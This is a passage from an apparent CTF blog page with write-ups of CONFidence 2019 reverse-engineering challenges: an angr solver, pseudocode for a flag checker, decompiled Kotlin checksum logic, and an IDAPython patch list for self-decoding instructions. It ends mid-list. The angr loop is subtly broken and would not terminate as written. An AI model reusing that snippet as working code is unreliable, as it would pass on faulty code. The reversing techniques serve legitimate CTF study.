@@ -1,0 +1,862 @@
+<!DOCTYPE html><html lang="en"> <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width"><link rel="icon" type="image/png" href="/favicon.png"><meta name="generator" content="Astro v5.11.1"><title>NiNi's Den. CyberSec Blog</title><link rel="stylesheet" href="/src/styles/cyber-space-theme.css"><link rel="stylesheet" href="/src/styles/light-theme.css"><style>.post-image-wrapper[data-astro-cid-no5unav3]{margin:1.5em auto;max-width:100%;position:relative;display:inline-block}.post-image-wrapper[data-astro-cid-no5unav3]:before{content:"";position:absolute;top:0;left:0;width:100%;height:100%;background-color:rgba(var(--color-accent-r),var(--color-accent-g),var(--color-accent-b),1);mix-blend-mode:color;pointer-events:none;transition:opacity .3s ease-in-out;opacity:1}.post-image-wrapper[data-astro-cid-no5unav3]:hover:before{opacity:0}.post-image[data-astro-cid-no5unav3]{display:block;max-width:100%;height:auto;border:1px solid var(--color-border);box-shadow:0 0 10px #0009;transition:all .3s ease-in-out}.post-image[data-astro-cid-no5unav3]:hover{filter:brightness(1) contrast(1);box-shadow:0 0 15px rgba(var(--color-accent-r),var(--color-accent-g),var(--color-accent-b),.7)}
+</style></head> <body style="margin: 0; padding-top: 60px;"> <script>
+            // Apply theme from localStorage immediately to prevent FOUC
+            const savedTheme = localStorage.getItem('theme');
+            if (savedTheme) {
+                document.body.classList.add(savedTheme);
+            } else {
+                document.body.classList.add('theme-light'); // Default theme
+                localStorage.setItem('theme', 'theme-light');
+            }
+        </script> <button id="theme-toggle" class="theme-toggle-btn">
+切換主題
+</button> <nav class="main-nav"> <ul class="main-nav-list"> <li class="main-nav-item"><a href="/" class="main-nav-link">Home</a></li> <li class="main-nav-item"><a href="/about" class="main-nav-link">About</a></li> </ul> </nav>  <div class="article-page-wrapper"> <aside class="author-hud"> <div class="author-hud-content glitchable"> <img src="//avatars2.githubusercontent.com/u/15998206" alt="NiNi's avatar" class="author-avatar"> <div class="author-info"> <h4><a href="https://balsn.tw/">NiNi</a></h4> <p class="title">Security Researcher</p> </div> </div> </aside> <div class="container"> <article class="post-content"> <h1>2019::CONFidence</h1> <p class="post-meta">Published: 2019-03-17 | Category: CTF</p> <p>Teaching CPR during the contest, so I decided to spend the next few day to sovle these challenges without looking writeups.</p>
+<h1 id="reverseelementary">Reverse::Elementary</h1>
+<h2 id="tldr">TL;DR</h2>
+<p>Solve this with angr is quick and easy</p>
+<pre><code class="language-py" metastring="solver.py">import angr
+import claripy
+f = open(&quot;./elementary&quot;,&quot;r&quot;).read()
+r = []
+a = 0
+find = 0x40077f
+while True:
+    #find all the
+    #   mov eax,0 
+    #   jmp xxxxxx
+    p = f.find(&quot;\xB8\x00\x00\x00\x00\xE9&quot;,a+1)
+    if a == -1:
+        break
+    r.append(a+0x400000)
+p = angr.Project(&quot;./elementary&quot;)
+flag_chars = [claripy.BVS(&#39;flag_%d&#39; % i, 8) for i in range(104)]
+flag = claripy.Concat(*flag_chars)
+st = p.factory.blank_state(stdin=flag)
+simgr = p.factory.simgr(st)
+simgr.explore(avoid=tuple(r),find=find)
+print simgr.found[0].posix.dumps(0)
+</code></pre>
+<p>flag:<code>p4{I_really_hope_you_automated_this_somehow_otherwise_it_might_be_a_bit_frustrating_to_do_this_manually}</code></p>
+<h2 id="details">details</h2>
+<p>The binary has lots of trivial functions, some of them return the <code>arg1</code> directly, the others return <code>arg1^1</code>, this prevents us from parsing the decompile result directly. The angr help us to solve this challenge without knowing anything about those functions.</p>
+<p>The other option to solve this is to laverage idapython to parse the decompile result directly, I used to do so.</p>
+<h1 id="reverseold-school">Reverse::Old school</h1>
+<h2 id="pseudo-code">pseudo code</h2>
+<pre><code class="language-py" metastring="logic.py">
+def sub_10148():
+    position = 0x50
+    for i in range(9):
+        input = input(&quot;hex&quot;)
+        input = int(input,16)
+
+        # column direction
+        if input &amp; 1 = 1
+                if position is 0 or position%18 != 16: #18 is the chars number in a row
+                    position += 1
+        if !(input &amp; 1)
+                if position is not 0 or position%18 != 0:
+                    position -= 1
+
+        # row direction
+        if input &amp; 2:
+            if position &lt; 0x8f: #0xa1/18 is the total rows of the output
+                position += 18
+        if !(input &amp; 2):
+            position &gt; 17:
+                position -= 18
+
+        input = input &gt;&gt; 2       # process next to bits of user input
+        memory[position] +=1
+
+def sub_10215():
+    string = &quot;p4{krule_ctf}&quot;
+    position = 0
+    for i in range(0xa1):
+
+        if array[memory[position]] &gt; 0xd:
+            bl = 0x5e
+        else:
+            bl = string[memory[position]+0xbc]
+
+        memory[position] = bl
+        position += 1
+</code></pre>
+<h2 id="details-1">details</h2>
+<p>The binary ask for 18 hexadecimal digits to draw a graph. Every two of them will be consider as a number, eg: <code>1a</code> = <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align:-0.375ex" xmlns="http://www.w3.org/2000/svg" width="4.05ex" height="1.881ex" role="img" focusable="false" viewBox="0 -666 1790.1 831.6" xmlns:xlink="http://www.w3.org/1999/xlink"><defs><path id="MJX-1-TEX-N-32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path><path id="MJX-1-TEX-N-36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z"></path><path id="MJX-1-TEX-N-31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path id="MJX-1-TEX-N-30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></defs><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mn"><use data-c="32" xlink:href="#MJX-1-TEX-N-32"></use><use data-c="36" xlink:href="#MJX-1-TEX-N-36" transform="translate(500,0)"></use></g><g data-mml-node="TeXAtom" transform="translate(1033,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><use data-c="31" xlink:href="#MJX-1-TEX-N-31"></use><use data-c="30" xlink:href="#MJX-1-TEX-N-30" transform="translate(500,0)"></use></g></g></g></g></g></svg></mjx-container>. Then, for each number, every two bits of them indicate a way to move on a 2D-array on memory. So, at the end of the funciton <code>sub_10148</code>, the data in 2D-array implys that how much times we walk on to a corresponding position.</p>
+<p>What <code>sub_10215</code> does is replace the number in array to the corresponding character in string <code>p4{krule_ctf}</code>. And <code>S</code> and <code>E</code> in the flag.txt means the start point and the end point. In summary, all we need to do is to find a way to move from <code>S</code> to <code>E</code> and also satify all the numbers marked on each position.</p>
+<p>Backtracking is a good choice, but I drew it on paper.</p>
+<pre><code class="language-py" metastring="original-array">        2 3211
+       1 3423 E
+      1 2213 1
+       2 1
+        S
+
+My solution is : ↖↖↗↗ ↘↙↙↗ ↘↗↖↖ ↘↗↘↖ ↘↗↖↖ ↗↙↙↗ ↙↗↘↖ ↘↗↙↗ ↗↙↘↗
+</code></pre>
+<p>Hexadecimal solution is <code>50 6b 07 37 07 69 36 67 79</code> (there should be no space in input)</p>
+<h1 id="reversepudliszki">Reverse::Pudliszki</h1>
+<h2 id="details-2">details</h2>
+<p>This challange gives us a .jar, after decompile, there is a package call kotlin inside it, it’s another language designed for JVM, I’ve never heard of it …, the result of decompiler looks like a mess … , and there are some weird class like <code>p.class</code>,<code>{.class</code>, <code>}.class</code>. It’s obviously would be use to verify the flag later.</p>
+<p>Take a look on main first :</p>
+<pre><code class="language-java" metastring="FlagCheckerKt.class">public final class FlagCheckerKt
+{
+  public static final void main(@NotNull String[] args)
+  {
+    Intrinsics.checkParameterIsNotNull(args, &quot;args&quot;);
+    String[] $receiver = args;
+    int $i$a$-with-FlagCheckerKt$main$1 = 0;
+    SizeResult localSizeResult = SizeResultFactory.Companion.check($receiver.length, A.class);
+    if ((localSizeResult instanceof Correct))
+    {
+      String str1;
+      if (validateFlag($receiver[0]) == 0)
+      {
+        str1 = &quot;Nice!&quot;;System.out.print(str1);
+      }
+      else
+      {
+        str1 = &quot;Not today&quot;;System.out.print(str1);
+        int i = -1;System.exit(i);throw ((Throwable)new RuntimeException(&quot;System.exit returned normally, while it was supposed to halt JVM.&quot;));
+      }
+    }
+    else if ((localSizeResult instanceof Incorrect))
+    {
+      String str2 = &quot;Failed&quot;;System.out.print(str2);
+      int j = -1;System.exit(j);throw ((Throwable)new RuntimeException(&quot;System.exit returned normally, while it was supposed to halt JVM.&quot;));
+    }
+  }
+</code></pre>
+<p><code>SizeResult localSizeResult = SizeResultFactory.Companion.check($receiver.length, A.class);</code>, this line checks the number of args equals to the length of the name of class A or not. Then, call <code>validateFlag</code> to verify the arg.</p>
+<p>The decompiled result of <code>validFlag</code> is a mess, need patience to read it, and try to write a couple lines of kotlin. Basically, what <code>validFlag</code> does is :</p>
+<ol>
+<li>
+<p>Turn the <code>flag</code> into a list of tuple, eg: <code>String &quot;abab&quot; -&gt; List [(a,0),(b,1),(a,2),(b,3)]</code></p>
+</li>
+<li>
+<p>Group the list from step 1 according to the <code>first</code> in each tuple, eg: <code>List [(a,0),(b,1),(a,2),(b,3)] -&gt; LinkedHashMap {a=[0,2],b=[1,3]}</code></p>
+</li>
+<li>
+<p>Call <code>checksum</code> to do some caculation on the LinkedHashMap from step 2</p>
+</li>
+</ol>
+<p>Follow into the function <code>checksum</code> :</p>
+<ol>
+<li>
+<p>Call <code>compress</code> to compress the list in LinkedHashMap. <code> LinkedHashMap {a=[0,2],b=[1,3]} -&gt; Collection {(a.class object instance, 0*1+2*32),(b,calss object instance, 1*1+3*32)}</code></p>
+</li>
+<li>
+<p>Do some caculate according to the <code>first</code> of each tuple and append it to a temp Collection.</p>
+</li>
+<li>
+<p>Apply <code>sum</code> on the Collection  and return the result, which should be <code>0</code></p>
+</li>
+</ol>
+<p>The caculate in step 2 is :</p>
+<pre><code class="language-java">localObject3 = Integer.valueOf(($i$a$-map-FlagCheckerKt$checksum$1 instanceof }) ? ((Number)entry.getSecond()).intValue() - 27 :
+ ($i$a$-map-FlagCheckerKt$checksum$1 instanceof _) ? ((Number)entry.getSecond()).intValue() - 19849 :
+ ($i$a$-map-FlagCheckerKt$checksum$1 instanceof u) ? ((Number)entry.getSecond()).intValue() - 25 :
+ ($i$a$-map-FlagCheckerKt$checksum$1 instanceof t) ? ((Number)entry.getSecond()).intValue() - 5 :
+ ($i$a$-map-FlagCheckerKt$checksum$1 instanceof s) ? ((Number)entry.getSecond()).intValue() - 11 :
+ ($i$a$-map-FlagCheckerKt$checksum$1 instanceof n) ? ((Number)entry.getSecond()).intValue() - 8 :
+ ($i$a$-map-FlagCheckerKt$checksum$1 instanceof l) ? ((Number)entry.getSecond()).intValue() - 486 :
+ ($i$a$-map-FlagCheckerKt$checksum$1 instanceof k) ? ((Number)entry.getSecond()).intValue() - 643 :
+ ($i$a$-map-FlagCheckerKt$checksum$1 instanceof i) ? ((Number)entry.getSecond()).intValue() - 16 :
+ ($i$a$-map-FlagCheckerKt$checksum$1 instanceof h) ? ((Number)entry.getSecond()).intValue() - 786 :
+ ($i$a$-map-FlagCheckerKt$checksum$1 instanceof e) ? ((Number)entry.getSecond()).intValue() - 21 :
+ ($i$a$-map-FlagCheckerKt$checksum$1 instanceof c) ? ((Number)entry.getSecond()).intValue() - 23 :
+ ($i$a$-map-FlagCheckerKt$checksum$1 instanceof 7) ? ((Number)entry.getSecond()).intValue() - 22 :
+ ($i$a$-map-FlagCheckerKt$checksum$1 instanceof 5) ? ((Number)entry.getSecond()).intValue() - 17 :
+ ($i$a$-map-FlagCheckerKt$checksum$1 instanceof 1) ? ((Number)entry.getSecond()).intValue() - 327 :
+ ($i$a$-map-FlagCheckerKt$checksum$1 instanceof 0) ? ((Number)entry.getSecond()).intValue() - 452 :
+ ($i$a$-map-FlagCheckerKt$checksum$1 instanceof {) ? ((Number)entry.getSecond()).intValue() - 2 :
+ ($i$a$-map-FlagCheckerKt$checksum$1 instanceof 4) ? ((Number)entry.getSecond()).intValue() - 1 :
+ ($i$a$-map-FlagCheckerKt$checksum$1 instanceof p) ? ((Number)entry.getSecond()).intValue() - 27040 :
+ 64199);
+</code></pre>
+<p>Get the flag by factorizing those number.</p>
+<p>flag:
+<code>p4{k0tl1n_1s_p0li5h_ke7chup}</code></p>
+<h1 id="reversewatchmem">Reverse::Watchmem</h1>
+<p>The binary fork itself by createprocess, then it would try to act like a debugger. When the children return a singal single step or signal illegal instrution, it will  decode the real instructions and put it back, and recover it after execution.
+It’s time comsuming to fully understand the mechanism, I try to analyze the pattern by hook WriteProcessMemory,which can be done by dll injection or debugger script. This is the snippet of result :</p>
+<pre><code class="language-python">0x401e69 2 #patch 0x401e69 0x401e69+1
+0xc9 0x8d   #change the bytes to 0xc9 0x8d
+0x401e69 16
+0x55 0x95 0xa9 0xbd 0x94 0x10 0xb1 0xe 0x8 0x28 0x96 0x55 0xca 0xb0 0xc3 0xb 
+0x401e69 16
+0xc9 0x8d 0x31 0x9b 0x2a 0x56 0x57 0x12 0x7a 0xb0 0x72 0x15 0xfe 0x36 0x4d 0x4f 
+0x401e69 2
+0xf 0xb
+0x401e6a 1
+0x95
+</code></pre>
+<p>It turns out that the second records always be the decoded instruction. So, all we need to do is patch it by IDApython</p>
+<pre><code class="language-python" metastring="ida.py">def go_patch(patch):
+    for i in patch:
+        ea = int(i[0],16)
+        p = i[1].split(&quot; &quot;)
+        for k in range(len(p)):
+                idc.PatchByte( ea+k , int(p[k],16))
+patch = [[&#39; 00401E69&#39;, &#39;c9&#39;],
+ [&#39; 00401E6A&#39;, &#39;89 e5&#39;],
+ [&#39; 00401E6C&#39;, &#39;83 ec 48&#39;],
+ [&#39; 00401E6F&#39;, &#39;c7 04 24 cc a0 43 00&#39;],
+ [&#39; 00401E76&#39;, &#39;e8 c9 4f 03 00 d5 23 64 9d e8 fa de 8d 34 9a 05&#39;],
+ [&#39; 00436E44&#39;, &#39;&#39;],
+ [&#39; 00401E7B&#39;, &#39;8d 45 d6&#39;],
+ [&#39; 00401E7E&#39;, &#39;89 44 24 04&#39;],
+ [&#39; 00401E82&#39;, &#39;c7 04 24 2f a1 43 00&#39;],
+ [&#39; 00401E89&#39;, &#39;e8 ae 4f 03 00 d5 23 69 41 28 15 78 b0 58 4d 07&#39;],
+ [&#39; 00436E3C&#39;, &#39;&#39;],
+ [&#39; 00401E8E&#39;, &#39;a1 a8 d1 43 00&#39;],
+ [&#39; 00401E93&#39;, &#39;89 04 24&#39;],
+ [&#39; 00401E96&#39;, &#39;e8 e9 4f 03 00 d5 23 64 9d 28 fa 9c c2 c1 9d cb&#39;],
+ [&#39; 00436E84&#39;, &#39;&#39;],
+ [&#39; 00401E9B&#39;, &#39;8d 45 d6&#39;],
+ [&#39; 00401E9E&#39;, &#39;89 04 24&#39;],
+ [&#39; 00401EA1&#39;, &#39;&#39;],
+ [&#39; 00401E30&#39;, &#39;55&#39;],
+ [&#39; 00401E31&#39;, &#39;89 e5&#39;],
+ [&#39; 00401E33&#39;, &#39;83 ec 28&#39;],
+ [&#39; 00401E36&#39;, &#39;c7 45 f4 a8 a0 43 00&#39;],
+ [&#39; 00401E3D&#39;, &#39;8b 45 08&#39;],
+ [&#39; 00401E40&#39;, &#39;89 04 24&#39;],
+ [&#39; 00401E43&#39;, &#39;&#39;],
+ [&#39; 00401E09&#39;, &#39;55&#39;],
+ [&#39; 00401E0A&#39;, &#39;89 e5&#39;],
+ [&#39; 00401E0C&#39;, &#39;83 ec 14&#39;],
+ [&#39; 00401E0F&#39;, &#39;c7 45 fc 00 00 00 00&#39;],
+ [&#39; 00401E16&#39;, &#39;eb 0f 8f a5 22 b9 26 d0 c0 60 3b e1 1f 55 fb d4&#39;],
+ [&#39; 00401E27&#39;, &#39;83 7d fc 0f&#39;],
+ [&#39; 00401E2B&#39;, &#39;&#39;],
+ [&#39; 00401E18&#39;, &#39;8b 45 08&#39;],
+ [&#39; 00401E1B&#39;, &#39;89 04 24&#39;],
+ [&#39; 00401E1E&#39;, &#39;&#39;],
+ [&#39; 00401DDF&#39;, &#39;55&#39;],
+ [&#39; 00401DE0&#39;, &#39;89 e5&#39;],
+ [&#39; 00401DE2&#39;, &#39;83 ec 04&#39;],
+ [&#39; 00401DE5&#39;, &#39;8b 45 08&#39;],
+ [&#39; 00401DE8&#39;, &#39;89 04 24&#39;],
+ [&#39; 00401DEB&#39;, &#39;&#39;],
+ [&#39; 00401C20&#39;, &#39;55&#39;],
+ [&#39; 00401C21&#39;, &#39;89 e5&#39;],
+ [&#39; 00401C23&#39;, &#39;53&#39;],
+ [&#39; 00401C24&#39;, &#39;83 ec 10&#39;],
+ [&#39; 00401C27&#39;, &#39;c7 45 f4 10 a0 43 00&#39;],
+ [&#39; 00401C2E&#39;, &#39;c7 45 f8 00 00 00 00&#39;],
+ [&#39; 00401C35&#39;, &#39;eb 28 8f a5 32 b7 e5 ec a7 4c ab c4 92 d9 b1 d8&#39;],
+ [&#39; 00401C5F&#39;, &#39;83 7d f8 1f&#39;],
+ [&#39; 00401C63&#39;, &#39;&#39;],
+ [&#39; 00401C37&#39;, &#39;8b 55 f8&#39;],
+ [&#39; 00401C3A&#39;, &#39;8b 45 08&#39;],
+ [&#39; 00401C3D&#39;, &#39;01 d0&#39;],
+ [&#39; 00401C3F&#39;, &#39;0f b6 18&#39;],
+ [&#39; 00401C42&#39;, &#39;8b 55 f8&#39;],
+ [&#39; 00401C45&#39;, &#39;8b 45 f4&#39;],
+ [&#39; 00401C48&#39;, &#39;01 d0&#39;],
+ [&#39; 00401C4A&#39;, &#39;0f b6 08&#39;],
+ [&#39; 00401C4D&#39;, &#39;8b 55 f8&#39;],
+ [&#39; 00401C50&#39;, &#39;8b 45 08&#39;],
+ [&#39; 00401C53&#39;, &#39;01 d0&#39;],
+ [&#39; 00401C55&#39;, &#39;31 cb&#39;],
+ [&#39; 00401C57&#39;, &#39;89 da&#39;],
+ [&#39; 00401C59&#39;, &#39;88 10&#39;],
+ [&#39; 00401C5B&#39;, &#39;83 45 f8 01&#39;],
+ [&#39; 00401C5F&#39;, &#39;0f 0b a6 5d a0 44&#39;],
+ [&#39; 00401C65&#39;, &#39;90&#39;],
+ [&#39; 00401C66&#39;, &#39;83 c4 10&#39;],
+ [&#39; 00401C69&#39;, &#39;5b&#39;],
+ [&#39; 00401C6A&#39;, &#39;5d&#39;],
+ [&#39; 00401C6B&#39;, &#39;c3 17 83 53 05 e4 e8 8f 5f 0e 33 a0 6a 10 47 5f&#39;],
+ [&#39; 00401DF0&#39;, &#39;8b 45 08&#39;],
+ [&#39; 00401DF3&#39;, &#39;89 04 24&#39;],
+ [&#39; 00401DF6&#39;, &#39;&#39;],
+ [&#39; 00401C6C&#39;, &#39;55&#39;],
+ [&#39; 00401C6D&#39;, &#39;89 e5&#39;],
+ [&#39; 00401C6F&#39;, &#39;83 ec 10&#39;],
+ [&#39; 00401C72&#39;, &#39;8b 45 08&#39;],
+ [&#39; 00401C75&#39;, &#39;0f b6 00&#39;],
+ [&#39; 00401C78&#39;, &#39;88 45 fb&#39;],
+ [&#39; 00401C7B&#39;, &#39;c7 45 fc 00 00 00 00&#39;],
+ [&#39; 00401C82&#39;, &#39;eb 36 8f a5 2e b7 e5 ec a7 4c ab c4 aa a4 1e cc&#39;],
+ [&#39; 00401CBA&#39;, &#39;83 7d fc 1e&#39;],
+ [&#39; 00401CBE&#39;, &#39;&#39;],
+ [&#39; 00401C84&#39;, &#39;8b 55 fc&#39;],
+ [&#39; 00401C87&#39;, &#39;8b 45 08&#39;],
+ [&#39; 00401C8A&#39;, &#39;01 d0&#39;],
+ [&#39; 00401C8C&#39;, &#39;0f b6 00&#39;],
+ [&#39; 00401C8F&#39;, &#39;c0 e8 04&#39;],
+ [&#39; 00401C92&#39;, &#39;89 c1&#39;],
+ [&#39; 00401C94&#39;, &#39;8b 45 fc&#39;],
+ [&#39; 00401C97&#39;, &#39;8d 50 01&#39;],
+ [&#39; 00401C9A&#39;, &#39;8b 45 08&#39;],
+ [&#39; 00401C9D&#39;, &#39;01 d0&#39;],
+ [&#39; 00401C9F&#39;, &#39;0f b6 00&#39;],
+ [&#39; 00401CA2&#39;, &#39;0f b6 c0&#39;],
+ [&#39; 00401CA5&#39;, &#39;c1 e0 04&#39;],
+ [&#39; 00401CA8&#39;, &#39;09 c1&#39;],
+ [&#39; 00401CAA&#39;, &#39;8b 55 fc&#39;],
+ [&#39; 00401CAD&#39;, &#39;8b 45 08&#39;],
+ [&#39; 00401CB0&#39;, &#39;01 d0&#39;],
+ [&#39; 00401CB2&#39;, &#39;89 ca&#39;],
+ [&#39; 00401CB4&#39;, &#39;88 10&#39;],
+ [&#39; 00401CB6&#39;, &#39;83 45 fc 01&#39;],
+ [&#39; 00401CBA&#39;, &#39;0f 0b a2 5e a0 52&#39;],
+ [&#39; 00401CC0&#39;, &#39;8b 45 08&#39;],
+ [&#39; 00401CC3&#39;, &#39;83 c0 1f&#39;],
+ [&#39; 00401CC6&#39;, &#39;0f b6 00&#39;],
+ [&#39; 00401CC9&#39;, &#39;c0 e8 04&#39;],
+ [&#39; 00401CCC&#39;, &#39;89 c2&#39;],
+ [&#39; 00401CCE&#39;, &#39;0f b6 45 fb&#39;],
+ [&#39; 00401CD2&#39;, &#39;c1 e0 04&#39;],
+ [&#39; 00401CD5&#39;, &#39;09 c2&#39;],
+ [&#39; 00401CD7&#39;, &#39;8b 45 08&#39;],
+ [&#39; 00401CDA&#39;, &#39;83 c0 1f&#39;],
+ [&#39; 00401CDD&#39;, &#39;88 10&#39;],
+ [&#39; 00401CDF&#39;, &#39;90&#39;],
+ [&#39; 00401CE0&#39;, &#39;c9&#39;],
+ [&#39; 00401CE1&#39;, &#39;c3 17 83 53 07 e4 38 78 a0 d0 7b 11 7a aa e8 d1&#39;],
+ [&#39; 00401DFB&#39;, &#39;8b 45 08&#39;],
+ [&#39; 00401DFE&#39;, &#39;89 04 24&#39;],
+ [&#39; 00401E01&#39;, &#39;&#39;],
+ [&#39; 00401CE2&#39;, &#39;55&#39;],
+ [&#39; 00401CE3&#39;, &#39;89 e5&#39;],
+ [&#39; 00401CE5&#39;, &#39;81 ec c0 00 00 00&#39;],
+ [&#39; 00401CEB&#39;, &#39;c7 45 f0 4c a0 43 00&#39;],
+ [&#39; 00401CF2&#39;, &#39;c7 45 fc 00 00 00 00&#39;],
+ [&#39; 00401CF9&#39;, &#39;eb 29 8f a5 2e b7 d5 f8 1f 88 b5 74 1f 9f ef c5&#39;],
+ [&#39; 00401D24&#39;, &#39;83 7d fc 1f&#39;],
+ [&#39; 00401D28&#39;, &#39;&#39;],
+ [&#39; 00401CFB&#39;, &#39;8b 45 fc&#39;],
+ [&#39; 00401CFE&#39;, &#39;8b 55 fc&#39;],
+ [&#39; 00401D01&#39;, &#39;89 94 85 6c ff ff ff&#39;],
+ [&#39; 00401D08&#39;, &#39;8b 55 fc&#39;],
+ [&#39; 00401D0B&#39;, &#39;8b 45 08&#39;],
+ [&#39; 00401D0E&#39;, &#39;01 d0&#39;],
+ [&#39; 00401D10&#39;, &#39;0f b6 00&#39;],
+ [&#39; 00401D13&#39;, &#39;8d 8d 4c ff ff ff&#39;],
+ [&#39; 00401D19&#39;, &#39;8b 55 fc&#39;],
+ [&#39; 00401D1C&#39;, &#39;01 ca&#39;],
+ [&#39; 00401D1E&#39;, &#39;88 02&#39;],
+ [&#39; 00401D20&#39;, &#39;83 45 fc 01&#39;],
+ [&#39; 00401D24&#39;, &#39;0f 0b a2 5d a0 45&#39;],
+ [&#39; 00401D2A&#39;, &#39;c7 45 f8 00 00 00 00&#39;],
+ [&#39; 00401D31&#39;, &#39;eb 6b 8f a5 32 a9 71 82 0d 23 e2 ff 42 c5 e5 78&#39;],
+ [&#39; 00401D9E&#39;, &#39;8b 55 f8&#39;],
+ [&#39; 00401DA1&#39;, &#39;8b 45 f0&#39;],
+ [&#39; 00401DA4&#39;, &#39;01 d0&#39;],
+ [&#39; 00401DA6&#39;, &#39;0f b6 00&#39;],
+ [&#39; 00401DA9&#39;, &#39;84 c0&#39;],
+ [&#39; 00401DAB&#39;, &#39;&#39;],
+ [&#39; 00401D33&#39;, &#39;8b 45 f8&#39;],
+ [&#39; 00401D36&#39;, &#39;99&#39;],
+ [&#39; 00401D37&#39;, &#39;c1 ea 1b&#39;],
+ [&#39; 00401D3A&#39;, &#39;01 d0&#39;],
+ [&#39; 00401D3C&#39;, &#39;83 e0 1f&#39;],
+ [&#39; 00401D3F&#39;, &#39;29 d0&#39;],
+ [&#39; 00401D41&#39;, &#39;8b 84 85 6c ff ff ff&#39;],
+ [&#39; 00401D48&#39;, &#39;88 45 ef&#39;],
+ [&#39; 00401D4B&#39;, &#39;8b 55 f8&#39;],
+ [&#39; 00401D4E&#39;, &#39;8b 45 f0&#39;],
+ [&#39; 00401D51&#39;, &#39;01 d0&#39;],
+ [&#39; 00401D53&#39;, &#39;0f b6 00&#39;],
+ [&#39; 00401D56&#39;, &#39;0f b6 c0&#39;],
+ [&#39; 00401D59&#39;, &#39;83 e0 1f&#39;],
+ [&#39; 00401D5C&#39;, &#39;89 c1&#39;],
+ [&#39; 00401D5E&#39;, &#39;8b 45 f8&#39;],
+ [&#39; 00401D61&#39;, &#39;99&#39;],
+ [&#39; 00401D62&#39;, &#39;c1 ea 1b&#39;],
+ [&#39; 00401D65&#39;, &#39;01 d0&#39;],
+ [&#39; 00401D67&#39;, &#39;83 e0 1f&#39;],
+ [&#39; 00401D6A&#39;, &#39;29 d0&#39;],
+ [&#39; 00401D6C&#39;, &#39;89 c2&#39;],
+ [&#39; 00401D6E&#39;, &#39;8b 84 8d 6c ff ff ff&#39;],
+ [&#39; 00401D75&#39;, &#39;89 84 95 6c ff ff ff&#39;],
+ [&#39; 00401D7C&#39;, &#39;8b 55 f8&#39;],
+ [&#39; 00401D7F&#39;, &#39;8b 45 f0&#39;],
+ [&#39; 00401D82&#39;, &#39;01 d0&#39;],
+ [&#39; 00401D84&#39;, &#39;0f b6 00&#39;],
+ [&#39; 00401D87&#39;, &#39;0f b6 c0&#39;],
+ [&#39; 00401D8A&#39;, &#39;83 e0 1f&#39;],
+ [&#39; 00401D8D&#39;, &#39;89 c2&#39;],
+ [&#39; 00401D8F&#39;, &#39;0f b6 45 ef&#39;],
+ [&#39; 00401D93&#39;, &#39;89 84 95 6c ff ff ff&#39;],
+ [&#39; 00401D9A&#39;, &#39;83 45 f8 01&#39;],
+ [&#39; 00401D9E&#39;, &#39;0f 0b a6 93 d1 ae 1d 46 0f 60 9e 9a 56 a9 90&#39;],
+ [&#39; 00401DAD&#39;, &#39;c7 45 f4 00 00 00 00&#39;],
+ [&#39; 00401DB4&#39;, &#39;eb 20 8f a5 36 b7 a6 6f 9a 19 f5 63 9f 0f 9a c5&#39;],
+ [&#39; 00401DD6&#39;, &#39;83 7d f4 1f&#39;],
+ [&#39; 00401DDA&#39;, &#39;&#39;],
+ [&#39; 00401DB6&#39;, &#39;8b 45 f4&#39;],
+ [&#39; 00401DB9&#39;, &#39;8b 84 85 6c ff ff ff&#39;],
+ [&#39; 00401DC0&#39;, &#39;8b 4d f4&#39;],
+ [&#39; 00401DC3&#39;, &#39;8b 55 08&#39;],
+ [&#39; 00401DC6&#39;, &#39;01 ca&#39;],
+ [&#39; 00401DC8&#39;, &#39;0f b6 84 05 4c ff ff ff&#39;],
+ [&#39; 00401DD0&#39;, &#39;88 02&#39;],
+ [&#39; 00401DD2&#39;, &#39;83 45 f4 01&#39;],
+ [&#39; 00401DD6&#39;, &#39;0f 0b aa 5d a0 3c&#39;],
+ [&#39; 00401DDC&#39;, &#39;90&#39;],
+ [&#39; 00401DDD&#39;, &#39;c9&#39;],
+ [&#39; 00401DDE&#39;, &#39;c3 17 83 53 05 e4 f4 8f 5f 0e b9 52 46 b0 5c 5c&#39;],
+ [&#39; 00401E06&#39;, &#39;90&#39;],
+ [&#39; 00401E07&#39;, &#39;c9&#39;],
+ [&#39; 00401E08&#39;, &#39;c3 17 83 53 05 e4 e4 53 5f 1a a0 52 24 78 a9 c3&#39;],
+ [&#39; 00401E23&#39;, &#39;83 45 fc 01&#39;],
+ [&#39; 00401E27&#39;, &#39;0f 0b a2 6d a0 2b&#39;],
+ [&#39; 00401E2D&#39;, &#39;90&#39;],
+ [&#39; 00401E2E&#39;, &#39;c9&#39;],
